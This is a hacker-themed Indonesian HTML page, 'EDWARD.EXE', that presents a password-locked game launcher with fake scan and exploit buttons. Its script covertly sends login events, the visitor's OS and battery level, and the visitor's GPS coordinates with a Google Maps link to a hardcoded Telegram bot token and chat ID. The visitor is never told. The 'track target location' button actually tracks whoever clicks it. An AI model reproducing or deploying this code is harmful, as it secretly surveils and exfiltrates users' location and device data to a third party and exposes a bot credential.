<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { margin: 0; padding: 0; background: black; overflow: hidden; font-family: 'Courier New', Courier, monospace; }
        canvas { display: block; position: fixed; top: 0; left: 0; z-index: -1; }
        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 3000; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #00ff00; }
        .login-box { border: 2px solid #00ff00; padding: 30px; border-radius: 10px; text-align: center; box-shadow: 0 0 20px #00ff00; background: black; }
        input#passkey { background: transparent; border: 1px solid #00ff00; color: #00ff00; padding: 10px; text-align: center; margin-top: 15px; outline: none; width: 200px; }
        #main-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #00ff00; text-align: center; background: rgba(0, 0, 0, 0.9); padding: 25px; border: 3px solid #00ff00; border-radius: 15px; width: 85%; max-width: 400px; z-index: 10; display: none; }
        .game-menu { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
        button { background: transparent; color: #00ff00; border: 2px solid #00ff00; padding: 12px 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 0.8em; }
        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; padding: 20px; box-sizing: border-box; color: #00ff00; overflow-y: auto; }
        #map { width: 100%; height: 250px; border: 2px solid #00ff00; margin-top: 10px; display: none; }
        .bar-container { width: 100%; border: 1px solid #00ff00; height: 15px; margin-top: 15px; }
        .bar-fill { width: 0%; height: 100%; background: #00ff00; }
        .exit-btn { width: 100%; height: 45px; background: #ff0000; color: white; border: none; margin-top: 15px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div id="login-screen">
        <div class="login-box">
            <h3>[ SYSTEM LOCKED ]</h3>
            <input type="password" id="passkey" placeholder="ACCESS KEY..." onkeypress="if(event.key==='Enter') checkPass()">
            <br><br>
            <button onclick="checkPass()" style="width: 100%;">AUTHORIZE</button>
        </div>
    </div>

    <div id="main-content">
        <h2>> EDWARD.EXE</h2>
        <div class="game-menu">
            <button onclick="window.location.href='intent:#Intent;package=com.dts.freefireth;end'">FREE FIRE</button>
            <button onclick="window.location.href='minecraft://'">MINECRAFT</button>
            <button onclick="window.location.href='roblox://'">ROBLOX</button>
            <button onclick="window.open('https://www.rainviewer.com/map.html', '_blank')">RADAR CUACA</button>
            <button onclick="alert('Terminal Exploit Aktif...')">TERMINAL</button>
            <button onclick="startScan()">SCAN SYSTEM</button>
            <button onclick="checkDevice()" style="grid-column: span 2;">CHECK DEVICE SENSOR</button>
            <button onclick="trackGPS()" style="grid-column: span 2; border-color: yellow; color: yellow;">📍 LACAK LOKASI TARGET</button>
            <button onclick="location.reload()" style="grid-column: span 2;">LOGOUT</button>
        </div>
    </div>

    <div id="gps-overlay" class="overlay">
        <h3>[ GPS INTERCEPTOR ]</h3>
        <div id="gps-logs">> Menghubungkan ke satelit...</div>
        <div class="bar-container"><div id="gps-bar" class="bar-fill"></div></div>
        <div id="map"></div>
        <button class="exit-btn" onclick="closeOverlay('gps-overlay')">CLOSE</button>
    </div>

    <div id="device-overlay" class="overlay">
        <h3>[ DEVICE INFO ]</h3>
        <div id="device-res" style="text-align: left; margin-top:20px;"></div>
        <button class="exit-btn" onclick="closeOverlay('device-overlay')">CLOSE</button>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        const canvas = document.getElementById('matrix'); const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const letters = "01"; const fontSize = 16; const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        function draw() { ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height); ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px arial"; drops.forEach((y, i) => { const text = letters.charAt(Math.floor(Math.random() * letters.length)); ctx.fillText(text, i * fontSize, y * fontSize); if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0; drops[i]++; }); }
        setInterval(draw, 33);

        // DATA TELEGRAM MASTER EDWARD
        const TG_TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
        const TG_ID = '7898572558';

        function sendTele(msg) {
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(msg)}`);
        }

        function checkPass() { if (document.getElementById("passkey").value.toUpperCase().trim() === "EDWARD-HECKER") { document.getElementById("login-screen").style.display = "none"; document.getElementById("main-content").style.display = "block"; sendTele("⚠️ INFO: Seseorang Login ke Web Edward!"); } }
        function closeOverlay(id) { document.getElementById(id).style.display = "none"; }

        function checkDevice() {
            document.getElementById("device-overlay").style.display = "block";
            const res = document.getElementById("device-res");
            const os = navigator.platform;
            res.innerHTML = `📱 OS: ${os}<br>🔋 Menarik data baterai...`;
            if(navigator.getBattery) {
                navigator.getBattery().then(b => {
                    const bat = Math.round(b.level * 100) + "%";
                    res.innerHTML = `📱 OS: ${os}<br>🔋 BATERAI: ${bat}`;
                    sendTele(`📱 DEVICE TERDETEKSI!\nOS: ${os}\nBaterai: ${bat}`);
                });
            } else {
                sendTele(`📱 DEVICE TERDETEKSI!\nOS: ${os}\nBaterai: N/A`);
            }
        }

        function trackGPS() {
            document.getElementById("gps-overlay").style.display = "block";
            const bar = document.getElementById("gps-bar");
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    let w = 0;
                    const intv = setInterval(() => {
                        w += 5; bar.style.width = w + "%";
                        if (w >= 100) {
                            clearInterval(intv);
                            document.getElementById("map").style.display = "block";
                            var map = L.map('map').setView([p.coords.latitude, p.coords.longitude], 15);
                            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                            L.marker([p.coords.latitude, p.coords.longitude]).addTo(map);
                            sendTele(`📍 LOKASI TARGET!\nLat: ${p.coords.latitude}\nLon: ${p.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                        }
                    }, 50);
                }, () => { sendTele("❌ Target Menolak Izin Lokasi!"); });
            }
        }

        function startScan() { 
            let w = 0;
            alert("Memulai Scan System...");
        }
    </script>
</body>
</html>
